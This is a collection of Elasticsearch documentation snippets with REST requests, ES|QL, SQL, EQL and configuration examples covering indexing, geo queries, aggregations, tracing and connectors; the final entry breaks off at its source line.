Stream Reindex in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to call the reindex data stream API to upgrade backing indices of a data stream. It specifies the data stream name and uses 'upgrade' mode to perform an in-place upgrade.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/reindex-data-stream.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPOST _migration/reindex\n{\n    \"source\": {\n        \"index\": \"my-data-stream\"\n    },\n    \"mode\": \"upgrade\"\n}\n```\n\n----------------------------------------\n\nTITLE: Geo-bounds Aggregation Result for Geo_shape Fields in Elasticsearch\nDESCRIPTION: This snippet shows the response format for a geo-bounds aggregation on geo_shape fields. It includes the top_left and bottom_right coordinates of the bounding box encompassing all shapes in the result set.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-geobounds-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  ...\n  \"aggregations\": {\n    \"viewport\": {\n      \"bounds\": {\n        \"top_left\": {\n          \"lat\": 52.39420966710895,\n          \"lon\": 4.912349972873926\n        },\n        \"bottom_right\": {\n          \"lat\": 52.374080987647176,\n          \"lon\": 4.969425117596984\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing geo_point data in Elasticsearch\nDESCRIPTION: This snippet shows how to index documents with `geo_point` fields in Elasticsearch. It defines a mapping with a nested `pin.location` property of type `geo_point` and then indexes a document with sample latitude and longitude values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-distance-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT /my_locations\n{\n  \"mappings\": {\n    \"properties\": {\n      \"pin\": {\n        \"properties\": {\n          \"location\": {\n            \"type\": \"geo_point\"\n          }\n        }\n      }\n    }\n  }\n}\n\nPUT /my_locations/_doc/1\n{\n  \"pin\": {\n    \"location\": {\n      \"lat\": 40.12,\n      \"lon\": -71.34\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Dynamic Tracing Settings via REST API\nDESCRIPTION: cURL command to dynamically update tracing configuration settings like sampling rate using the Elasticsearch cluster settings API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/TRACING.md#2025-04-21_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ncurl -XPUT \\\n  -H \"Content-type: application/json\" \\\n  -u \"$USERNAME:$PASSWORD\" \\\n  -d '{ \"persistent\": { \"telemetry.agent.transaction_sample_rate\": \"0.75\" } }' \\\n  https://localhost:9200/_cluster/settings\n```\n\n----------------------------------------\n\nTITLE: Indexing a Polygon with Hole using GeoJSON in Elasticsearch\nDESCRIPTION: Adds a document to the 'example' index with a Polygon geometry that includes a hole, specified in GeoJSON format. The first array represents the outer boundary, and the second array represents the interior hole.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/geo-shape.md#2025-04-21_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nPOST /example/_doc\n{\n  \"location\" : {\n    \"type\" : \"Polygon\",\n    \"coordinates\" : [\n      [ [100.0, 0.0], [101.0, 0.0], [101.0, 1.0], [100.0, 1.0], [100.0, 0.0] ],\n      [ [100.2, 0.2], [100.8, 0.2], [100.8, 0.8], [100.2, 0.8], [100.2, 0.2] ]\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Double Field Script for Voltage Adjustment\nDESCRIPTION: This script uses the double_field context to adjust voltage readings for a specific sensor model. It demonstrates conditional logic and numeric operations in Painless scripts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-api-examples.md#2025-04-21_snippet_11\n\nLANGUAGE: console\nCODE:\n```\nPOST /_scripts/painless/_execute\n{\n  \"script\": {\n    \"source\": \"\"\"\n      if (doc['model_number'].value.equals('QVKC92Q'))\n      {emit(1.7 * params._source['measures']['voltage']);}\n      else{emit(params._source['measures']['voltage']);}\n    \"\"\"\n  },\n  \"context\": \"double_field\",\n  \"context_setup\": {\n    \"index\": \"my-index-000001\",\n    \"document\": {\n      \"@timestamp\": 1516470094000,\n      \"model_number\": \"QVKC92Q\",\n      \"measures\": {\n        \"voltage\": 5.6\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Optimized Search with Early Termination in Elasticsearch\nDESCRIPTION: Demonstrates efficient search query with early termination by disabling total hits tracking for better performance.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/sorting.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /events/_search\n{\n  \"size\": 10,\n  \"sort\": [\n      { \"timestamp\": \"desc\" }\n  ],\n  \"track_total_hits\": false\n}\n```\n\n----------------------------------------\n\nTITLE: Setting up Circle Processor Pipeline in Elasticsearch\nDESCRIPTION: This snippet shows how to create an index with geo_shape mapping and define an ingest pipeline with the circle processor. The pipeline converts circle shapes to polygons with a specified error distance, allowing for efficient indexing and querying of circle-like geometries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/ingest-circle-processor.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT circles\n{\n  \"mappings\": {\n    \"properties\": {\n      \"circle\": {\n        \"type\": \"geo_shape\"\n      }\n    }\n  }\n}\n\nPUT _ingest/pipeline/polygonize_circles\n{\n  \"description\": \"translate circle to polygon\",\n  \"processors\": [\n    {\n      \"circle\": {\n        \"field\": \"circle\",\n        \"error_distance\": 28.0,\n        \"shape_type\": \"geo_shape\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Using bool_prefix Query Type in Elasticsearch\nDESCRIPTION: Example of a bool_prefix query that searches for \"quick brown f\" across subject and message fields. This type behaves like most_fields but uses match_bool_prefix queries for better prefix matching at the end of the query string.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-multi-match-query.md#2025-04-21_snippet_14\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"multi_match\" : {\n      \"query\":      \"quick brown f\",\n      \"type\":       \"bool_prefix\",\n      \"fields\":     [ \"subject\", \"message\" ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Indexing Slow Log Settings for a Single Index\nDESCRIPTION: This snippet demonstrates how to update indexing slow log settings for a specific index using the Elasticsearch Update Indices Settings API. It sets thresholds for different log levels, configures source logging, and enables user information inclusion.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/slow-log.md#2025-04-21_snippet_5\n\nLANGUAGE: json\nCODE:\n```\nPUT /my-index-000001/_settings\n{\n  \"index.indexing.slowlog.threshold.index.warn\": \"10s\",\n  \"index.indexing.slowlog.threshold.index.info\": \"5s\",\n  \"index.indexing.slowlog.threshold.index.debug\": \"2s\",\n  \"index.indexing.slowlog.threshold.index.trace\": \"500ms\",\n  \"index.indexing.slowlog.source\": \"1000\",\n  \"index.indexing.slowlog.reformat\": true,\n  \"index.indexing.slowlog.include.user\": true\n}\n```\n\n----------------------------------------\n\nTITLE: Named Queries with Scores in Elasticsearch\nDESCRIPTION: This code shows an example that includes the score associated with named queries by including the request parameter `include_named_queries_score`. The response will include a `matched_queries` map that contains the name of the query that matched as a key and its associated score as the value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-bool-query.md#2025-04-21_snippet_6\n\nLANGUAGE: console\nCODE:\n```\nGET /_search?include_named_queries_score\n{\n  \"query\": {\n    \"bool\": {\n      \"should\": [\n        { \"match\": { \"name.first\": { \"query\": \"shay\", \"_name\": \"first\" } } },\n        { \"match\": { \"name.last\": { \"query\": \"banon\", \"_name\": \"last\" } } }\n      ],\n      \"filter\": {\n        \"terms\": {\n          \"name.last\": [ \"banon\", \"kimchy\" ],\n          \"_name\": \"test\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Downloading Sample Configuration File using Curl\nDESCRIPTION: Retrieves the sample configuration file for Elasticsearch connectors from the official GitHub repository\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-servicenow.md#2025-04-21_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ncurl https://raw.githubusercontent.com/elastic/connectors/main/config.yml.example --output ~/connectors-config/config.yml\n```\n\n----------------------------------------\n\nTITLE: Indexing a Document with Text Analysis in Elasticsearch Console\nDESCRIPTION: This snippet details how to index a document containing a 'text' field in Elasticsearch using the console. 'Quick Brown Foxes!' is set in the 'full_text' field in the document. Elasticsearch automatically tokenizes and lowers case as part of analysis, altering the value to tokens like 'quick', 'brown', 'fox'. These transformations affect query matches.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-term-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001/_doc/1\n{\n  \"full_text\":   \"Quick Brown Foxes!\"\n}\n```\n\n----------------------------------------\n\nTITLE: Addition Operator in Elasticsearch SQL\nDESCRIPTION: Demonstrates the use of addition operator (+) to sum two numeric values\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-operators-math.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSELECT 1 + 1 AS x;\n```\n\n----------------------------------------\n\nTITLE: Creating Time-Based Sorted Index in Elasticsearch\nDESCRIPTION: Example of creating an events index sorted by timestamp in descending order for time-series data.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/sorting.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT events\n{\n  \"settings\": {\n    \"index\": {\n      \"sort.field\": \"timestamp\",\n      \"sort.order\": \"desc\"\n    }\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"timestamp\": {\n        \"type\": \"date\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Calculating Sample Standard Deviation with STDDEV_SAMP in SQL\nDESCRIPTION: This SQL snippet demonstrates how to use the STDDEV_SAMP function in Elasticsearch SQL to calculate the sample standard deviation of a numeric field (field_name). The function returns a double representing the sample standard deviation of the input values, ignoring nulls.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-aggs.md#2025-04-21_snippet_15\n\nLANGUAGE: sql\nCODE:\n```\n```sql\nSTDDEV_SAMP(field_name) <1>\n```\n```\n\n----------------------------------------\n\nTITLE: High-precision Geotile Grid Aggregation with Geo Bounding Box Filter\nDESCRIPTION: This example demonstrates how to perform a high-precision geotile grid aggregation (precision 22) with a geo_bounding_box filter to limit the scope. The filter is applied to avoid generating millions of buckets when using high precision levels.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-geotilegrid-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /museums/_search?size=0\n{\n  \"aggregations\": {\n    \"zoomed-in\": {\n      \"filter\": {\n        \"geo_bounding_box\": {\n          \"location\": {\n            \"top_left\": \"POINT (4.9 52.4)\",\n            \"bottom_right\": \"POINT (5.0 52.3)\"\n          }\n        }\n      },\n      \"aggregations\": {\n        \"zoom1\": {\n          \"geotile_grid\": {\n            \"field\": \"location\",\n            \"precision\": 22\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Bulk Indexing Sample Documents for Highlighting\nDESCRIPTION: Indexes two sample documents with the 'comment' field for testing highlighting functionality - one with 'run with scissors' and another with 'running with scissors'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_10\n\nLANGUAGE: json\nCODE:\n```\nPUT index1/_bulk?refresh=true\n{\"index\": {\"_id\": \"doc1\" }}\n{\"comment\": \"run with scissors\"}\n{ \"index\" : {\"_id\": \"doc2\"} }\n{\"comment\": \"running with scissors\"}\n```\n\n----------------------------------------\n\nTITLE: Computing MD5 and SHA-256 Hashes using ESQL\nDESCRIPTION: Example query demonstrating how to compute multiple hash values (MD5 and SHA-256) for message field data. The query filters out connection error messages, computes hashes, and retains only relevant fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/functions/hash.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM sample_data\n| WHERE message != \"Connection error\"\n| EVAL md5 = hash(\"md5\", message), sha256 = hash(\"sha256\", message)\n| KEEP message, md5, sha256\n```\n\n----------------------------------------\n\nTITLE: Creating Index with Term Vectors for Optimized more_like_this Queries\nDESCRIPTION: Example of creating an index with specific field configurations to optimize more_like_this queries by enabling term_vector storage for faster analysis.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-mlt-query.md#2025-04-22_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT /imdb\n{\n  \"mappings\": {\n    \"properties\": {\n      \"title\": {\n        \"type\": \"text\",\n        \"term_vector\": \"yes\"\n      },\n      \"description\": {\n        \"type\": \"text\"\n      },\n      \"tags\": {\n        \"type\": \"text\",\n        \"fields\": {\n          \"raw\": {\n            \"type\": \"text\",\n            \"analyzer\": \"keyword\",\n            \"term_vector\": \"yes\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Terms Set Query Using minimum_should_match_script\nDESCRIPTION: This snippet shows how to use a script to dynamically determine the required number of matching terms. The script uses Math.min to ensure the required matches don't exceed the number of terms provided in the query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-terms-set-query.md#2025-04-21_snippet_4\n\nLANGUAGE: console\nCODE:\n```\nGET /job-candidates/_search\n{\n  \"query\": {\n    \"terms_set\": {\n      \"programming_languages\": {\n        \"terms\": [ \"c++\", \"java\", \"php\" ],\n        \"minimum_should_match_script\": {\n          \"source\": \"Math.min(params.num_terms, doc['required_matches'].value)\"\n        },\n        \"boost\": 1.0\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Indexing Suggestions with Geo Location Context in Elasticsearch\nDESCRIPTION: This snippet shows how to index suggestions with geo location contexts in Elasticsearch. It demonstrates associating multiple geo points with a single suggestion, which allows for location-based filtering and boosting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-suggesters.md#2025-04-21_snippet_24\n\nLANGUAGE: console\nCODE:\n```\nPUT place/_doc/1\n{\n  \"suggest\": {\n    \"input\": \"timmy's\",\n    \"contexts\": {\n      \"location\": [\n        {\n          \"lat\": 43.6624803,\n          \"lon\": -79.3863353\n        },\n        {\n          \"lat\": 43.6624718,\n          \"lon\": -79.3873227\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Mutual Information Score\nDESCRIPTION: Example showing how to use mutual information as a significance measure with optional parameters for including negatives.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-significantterms-aggregation.md#2025-04-21_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\n\"mutual_information\": {\n     \"include_negatives\": true\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL REVERSE Function Template Structure\nDESCRIPTION: Template structure for REVERSE function documentation that includes image and references to separate markdown files for parameters, description, types and examples.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/reverse.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n## `REVERSE` [esql-reverse]\n\n**Syntax**\n\n:::{image} ../../../images/functions/reverse.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/reverse.md\n:::\n\n:::{include} ../description/reverse.md\n:::\n\n:::{include} ../types/reverse.md\n:::\n\n:::{include} ../examples/reverse.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Configuring Error Retry Interval\nDESCRIPTION: Dynamic setting for the number of retries before signaling an index is stuck in an error state. Defaults to 10 retries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/data-stream-lifecycle-settings.md#2025-04-21_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\ndata_streams.lifecycle.signalling.error_retry_interval: 10\n```\n\n----------------------------------------\n\nTITLE: Defining Sorani Stop Words\nDESCRIPTION: Defines the Sorani stop words to be used in Elasticsearch text analysis, linked to the Lucene file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-stop-tokenfilter.md#2025-04-21_snippet_35\n\nLANGUAGE: markdown\nCODE:\n```\n`_sorani_`\n:   [Sorani stop words](https://github.com/apache/lucene/blob/main/lucene/analysis/common/src/resources/org/apache/lucene/analysis/ckb/stopwords.txt)\n```\n\n----------------------------------------\n\nTITLE: COUNT_DISTINCT with SPLIT Function in ESQL\nDESCRIPTION: Demonstrates combining COUNT_DISTINCT with the SPLIT function to count unique values from a delimited string. The example splits a semicolon-delimited string and counts distinct values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/count_distinct.md#2025-04-21_snippet_2\n\nLANGUAGE: esql\nCODE:\n```\nROW words=\"foo;bar;baz;qux;quux;foo\"\n| STATS distinct_word_count = COUNT_DISTINCT(SPLIT(words, \";\"))\n```\n\n----------------------------------------\n\nTITLE: Configuring SSL/TLS Security Settings in Elasticsearch\nDESCRIPTION: SSL/TLS security configuration including certificate, keystore, and truststore settings. These settings control how Elasticsearch handles secure connections with certificate validation and protocol support.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nssl.key: path/to/key.pem\nssl.key_passphrase: password\nssl.secure_key_passphrase: password\nssl.certificate: path/to/cert.pem\nssl.certificate_authorities: [path/to/ca.pem]\nssl.keystore.path: path/to/keystore\nssl.keystore.type: jks\nssl.keystore.password: password\nssl.keystore.secure_password: password\nssl.truststore.path: path/to/truststore\nssl.truststore.type: jks\nssl.verification_mode: full\nssl.supported_protocols: [\"TLSv1.3\",\"TLSv1.2\"]\n```\n\n----------------------------------------\n\nTITLE: Parent ID Query Example\nDESCRIPTION: Demonstrates a search query to retrieve child documents associated with a specific parent document ID using the parent_id query type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-parent-id-query.md#2025-04-21_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"query\": {\n    \"parent_id\": {\n      \"type\": \"my-child\",\n      \"id\": \"1\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: ES|QL Parameterized Query\nDESCRIPTION: Shows how to use query parameters in function named parameters with REST API.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/esql-syntax.md#2025-04-21_snippet_7\n\nLANGUAGE: esql\nCODE:\n```\nFROM library\n| EVAL year = DATE_EXTRACT(\"year\", release_date)\n| WHERE page_count > ? AND match(author, ?, {\"minimum_should_match\": ?})\n| LIMIT 5\n```\n\n----------------------------------------\n\nTITLE: Advanced QUERY Examples with Multiple Conditions in Elasticsearch SQL\nDESCRIPTION: Example showing complex query_string functionality including exists checks, range queries, regex, and fuzzy matching.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-search.md#2025-04-21_snippet_6\n\nLANGUAGE: sql\nCODE:\n```\nSELECT author, name, page_count, SCORE() FROM library WHERE QUERY('_exists_:\"author\" AND page_count:>200 AND (name:/star.*/ OR name:duna~)');\n\n      author      |       name        |  page_count   |    SCORE()\n------------------+-------------------+---------------+---------------\nFrank Herbert     |Dune               |604            |3.7164764\nFrank Herbert     |Dune Messiah       |331            |3.4169943\nFrank Herbert     |Children of Dune   |408            |3.2064917\nFrank Herbert     |God Emperor of Dune|454            |3.0504425\nPeter F. Hamilton |Pandora's Star     |768            |3.0\nRobert A. Heinlein|Starship Troopers  |335            |3.0\n```\n\n----------------------------------------\n\nTITLE: Using search_after with Field Collapsing\nDESCRIPTION: Shows how to use the search_after parameter with field collapsing for pagination. This only works when sorting and collapsing on the same field, without secondary sorts.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/collapse-search-results.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"query\": {\n    \"match\": {\n      \"message\": \"GET /search\"\n    }\n  },\n  \"collapse\": {\n    \"field\": \"user.id\"\n  },\n  \"sort\": [ \"user.id\" ],\n  \"search_after\": [\"dd5ce1ad\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Analyzing Text with Default Shingle Filter in Elasticsearch\nDESCRIPTION: This example demonstrates how to use the analyze API with the default shingle filter to add two-word shingles to a token stream.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-shingle-tokenfilter.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_analyze\n{\n  \"tokenizer\": \"whitespace\",\n  \"filter\": [ \"shingle\" ],\n  \"text\": \"quick brown fox jumps\"\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Up Elasticsearch Connector Configuration\nDESCRIPTION: Sets up the connector configuration in a YAML file. Replace the placeholders with actual Elasticsearch endpoint and API key before using.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/api-tutorial.md#2025-04-21_snippet_12\n\nLANGUAGE: yaml\nCODE:\n```\nelasticsearch.host: <ELASTICSEARCH_ENDPOINT> # Your Elasticsearch endpoint\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY> # Your Elasticsearch API key\n\nconnectors:\n  - connector_id: \"my-connector-id\"\n    service_type: \"postgresql\"\n```\n\n----------------------------------------\n\nTITLE: Concatenating Name Fields using ESQL CONCAT Function\nDESCRIPTION: Demonstrates using the CONCAT function to combine first_name and last_name fields with a space separator into a new fullname field. The example shows how to use KEEP to select specific columns and EVAL to create a new computed column.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/concat.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| KEEP first_name, last_name\n| EVAL fullname = CONCAT(first_name, \" \", last_name)\n```\n\n----------------------------------------\n\nTITLE: Configuring Transport Layer Tracer\nDESCRIPTION: Sets the logging level for the transport layer tracer to TRACE.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_16\n\nLANGUAGE: console\nCODE:\n```\nPUT _cluster/settings\n{\n   \"persistent\" : {\n      \"logger.org.elasticsearch.transport.TransportService.tracer\" : \"TRACE\"\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting Maximum X Coordinate from Geometric Data using ESQL\nDESCRIPTION: This SQL query demonstrates the usage of the ESQL function for extracting the maximum X coordinate (longitude) from various geometric data types. It includes test cases for different input formats and expected outputs.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/st_xmax.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n```\n\n----------------------------------------\n\nTITLE: Filtering with TODAY Function and Interval in Elasticsearch SQL\nDESCRIPTION: Example showing how to use TODAY() function with INTERVAL subtraction for relative date filtering.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_11\n\nLANGUAGE: sql\nCODE:\n```\nSELECT first_name FROM emp WHERE hire_date > TODAY() - INTERVAL 35 YEARS ORDER BY first_name ASC LIMIT 5;\n\n first_name\n------------\nAlejandro\nAmabile\nAnoosh\nBasil\nBrendon\n```\n\n----------------------------------------\n\nTITLE: Simulating Script Processor to Set Document Index\nDESCRIPTION: This example shows how to use a Painless script in the script processor to set a document's '_index' field. It combines the 'lang' field from the document with a 'dataset' parameter to create the new index name.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/script-processor.md#2025-04-21_snippet_1\n\nLANGUAGE: json\nCODE:\n```\nPOST _ingest/pipeline/_simulate\n{\n  \"pipeline\": {\n    \"processors\": [\n      {\n        \"script\": {\n          \"description\": \"Set index based on `lang` field and `dataset` param\",\n          \"lang\": \"painless\",\n          \"source\": \"\"\"\n            ctx['_index'] = ctx['lang'] + '-' + params['dataset'];\n          \"\"\",\n          \"params\": {\n            \"dataset\": \"catalog\"\n          }\n        }\n      }\n    ]\n  },\n  \"docs\": [\n    {\n      \"_index\": \"generic-index\",\n      \"_source\": {\n        \"lang\": \"fr\"\n      }\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Case-Insensitive Wildcard Matching in Elasticsearch EQL\nDESCRIPTION: Shows the use of the : operator for case-insensitive equality comparisons with wildcard support.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_30\n\nLANGUAGE: eql\nCODE:\n```\nprocess_name : \"cmd*.exe\"\n```\n\n----------------------------------------\n\nTITLE: Querying and Transforming Employee Data with ESQL\nDESCRIPTION: This ESQL query sorts employees by emp_no, selects specific columns, and calculates height in feet and centimeters from the original height value in meters. It demonstrates sorting, column selection, and mathematical operations in ESQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/examples/eval.csv-spec/eval.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| SORT emp_no\n| KEEP first_name, last_name, height\n| EVAL height_feet = height * 3.281, height_cm = height * 100\n```\n\n----------------------------------------\n\nTITLE: Multi-match Bool Prefix Query with Highlighting\nDESCRIPTION: Shows how to perform a bool_prefix query across multiple subfields with highlighting configuration. This query type is optimized for search-as-you-type functionality.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/search-as-you-type.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET my-index-000001/_search\n{\n  \"query\": {\n    \"multi_match\": {\n      \"query\": \"brown f\",\n      \"type\": \"bool_prefix\",\n      \"fields\": [\n        \"my_field\",\n        \"my_field._2gram\",\n        \"my_field._3gram\"\n      ]\n    }\n  },\n  \"highlight\": {\n    \"fields\": {\n      \"my_field\": {\n        \"matched_fields\": [\"my_field._index_prefix\"]\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Case-Insensitive Function in Elasticsearch EQL\nDESCRIPTION: Demonstrates how to make a function case-insensitive in Elasticsearch EQL using the ~ operator.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_29\n\nLANGUAGE: eql\nCODE:\n```\nendsWith~(process_name, \".exe\")\n```\n\n----------------------------------------\n\nTITLE: EQL Sequence Query with Until\nDESCRIPTION: Example query searching for sequences containing event A followed by event B, with C as expiration event.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-syntax.md#2025-04-21_snippet_18\n\nLANGUAGE: eql\nCODE:\n```\nsequence by ID\n  A\n  B\nuntil C\n```\n\n----------------------------------------\n\nTITLE: Calculating Cumulative Sales Example\nDESCRIPTION: Demonstrates how to calculate cumulative sum of monthly sales using date histogram and sum aggregations. Uses calendar_interval for monthly buckets and tracks running total of the price field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-cumulative-sum-aggregation.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPOST /sales/_search\n{\n  \"size\": 0,\n  \"aggs\": {\n    \"sales_per_month\": {\n      \"date_histogram\": {\n        \"field\": \"date\",\n        \"calendar_interval\": \"month\"\n      },\n      \"aggs\": {\n        \"sales\": {\n          \"sum\": {\n            \"field\": \"price\"\n          }\n        },\n        \"cumulative_sales\": {\n          \"cumulative_sum\": {\n            \"buckets_path\": \"sales\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Output Document After Community ID Processing\nDESCRIPTION: Resulting document after the Community ID processor has been applied. The processor adds a 'community_id' field to the 'network' object, containing the computed Community ID for the network flow.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/community-id-processor.md#2025-04-21_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n\"_source\" : {\n  \"destination\" : {\n    \"port\" : 80,\n    \"ip\" : \"55.56.57.58\"\n  },\n  \"source\" : {\n    \"port\" : 12345,\n    \"ip\" : \"123.124.125.126\"\n  },\n  \"network\" : {\n    \"community_id\" : \"1:9qr9Z1LViXcNwtLVOHZ3CL8MlyM=\",\n    \"transport\" : \"TCP\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Incrementing a Long Counter in Elasticsearch\nDESCRIPTION: This code snippet demonstrates how to register a LongCounter with the MeterRegistry and increment its value, both with and without attributes.  The counter is registered with a name, description, and unit of measure. It utilizes the `increment()` and `incrementBy()` methods to increase the counter's value.\nSOURCE: 